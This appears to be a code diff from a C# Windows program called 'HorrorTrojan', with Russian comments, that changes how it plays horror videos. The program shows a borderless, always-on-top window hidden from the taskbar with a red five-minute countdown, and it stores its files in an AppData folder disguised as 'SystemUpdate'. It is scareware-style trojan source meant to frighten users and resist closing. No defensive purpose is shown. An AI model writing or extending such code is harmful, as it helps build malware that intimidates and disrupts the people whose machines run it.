@@ -45,7 +45,6 @@ namespace HorrorTrojan
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private Image gifImage;
         private WindowsMediaPlayer musicPlayer;
-        private WindowsMediaPlayer videoPlayer;
 
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
 
@@ -55,57 +54,8 @@ namespace HorrorTrojan
             this.Load += MainInterface_Load;
         }
 
-        private void InitializeComponent()
-        {
-            this.pictureBox = new PictureBox();
-            this.timerLabel = new Label();
-            this.bottomPanel = new Panel();
-            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
-            this.SuspendLayout();
-
-            this.FormBorderStyle = FormBorderStyle.None;
-            this.StartPosition = FormStartPosition.CenterScreen;
-            this.TopMost = true;
-            this.ShowInTaskbar = false;
-            this.BackColor = Color.Black;
-            this.Size = new Size(448, 520);
-            this.DoubleBuffered = true;
-            this.ControlBox = false;
-            this.KeyPreview = false;
-
-            this.pictureBox.Dock = DockStyle.Top;
-            this.pictureBox.Size = new Size(448, 448);
-            this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
-            this.pictureBox.BackColor = Color.Black;
-
-            this.bottomPanel.Dock = DockStyle.Bottom;
-            this.bottomPanel.Height = 72;
-            this.bottomPanel.BackColor = Color.Black;
-
-            this.timerLabel.AutoSize = false;
-            this.timerLabel.Dock = DockStyle.Fill;
-            this.timerLabel.TextAlign = ContentAlignment.MiddleCenter;
-            this.timerLabel.ForeColor = Color.Red;
-            this.timerLabel.BackColor = Color.Black;
-            this.timerLabel.Font = new Font("Consolas", 48, FontStyle.Bold);
-            this.timerLabel.Text = "5:00";
-
-            this.bottomPanel.Controls.Add(this.timerLabel);
-            this.Controls.Add(this.pictureBox);
-            this.Controls.Add(this.bottomPanel);
-
-            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
-            this.ResumeLayout(false);
-        }
-
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            // ПРИНУДИТЕЛЬНО ПОКАЗЫВАЕМ ФОРМУ
-            this.WindowState = FormWindowState.Normal;
-            this.Show();
-            this.BringToFront();
-            this.Focus();
-
             if (!Directory.Exists(appDataPath))
                 Directory.CreateDirectory(appDataPath);
 
@@ -286,47 +236,28 @@ namespace HorrorTrojan
                     return;
                 }
 
-                // ОТДЕЛЬНОЕ ОКНО ДЛЯ ВИДЕО (без рамок)
-                Form videoForm = new Form();
-                videoForm.FormBorderStyle = FormBorderStyle.None;
-                videoForm.WindowState = FormWindowState.Maximized;
-                videoForm.TopMost = true;
-                videoForm.ShowInTaskbar = false;
-                videoForm.BackColor = Color.Black;
-
-                videoPlayer = new WindowsMediaPlayer();
-                videoPlayer.URL = videoPath;
-                videoPlayer.settings.autoStart = true;
-                videoPlayer.settings.setMode("loop", false);
-                videoPlayer.controls.play();
-
-                // ЖДЁМ ОКОНЧАНИЯ ВИДЕО
                 var videoThread = new Thread(() =>
                 {
                     try
                     {
-                        while (videoPlayer.playState != WMPPlayState.wmppsStopped &&
-                               videoPlayer.playState != WMPPlayState.wmppsMediaEnded)
+                        Process.Start(new ProcessStartInfo
                         {
-                            Thread.Sleep(100);
-                        }
+                            FileName = videoPath,
+                            UseShellExecute = true,
+                            CreateNoWindow = true,
+                            WindowStyle = ProcessWindowStyle.Maximized
+                        });
+                        Thread.Sleep(5000);
                     }
                     catch { }
                     finally
                     {
-                        videoForm.BeginInvoke((Action)(() =>
-                        {
-                            try { videoPlayer.close(); } catch { }
-                            videoForm.Close();
-                            isVideoActive = false;
-                            videoTimer.Start();
-                        }));
+                        isVideoActive = false;
+                        videoTimer.Start();
                     }
                 });
                 videoThread.IsBackground = true;
                 videoThread.Start();
-
-                videoForm.Show();
             }
             catch
             {
@@ -417,7 +348,6 @@ namespace HorrorTrojan
                 videoTimer?.Dispose();
                 gifImage?.Dispose();
                 try { musicPlayer?.close(); } catch { }
-                try { videoPlayer?.close(); } catch { }
             }
             base.Dispose(disposing);
         }
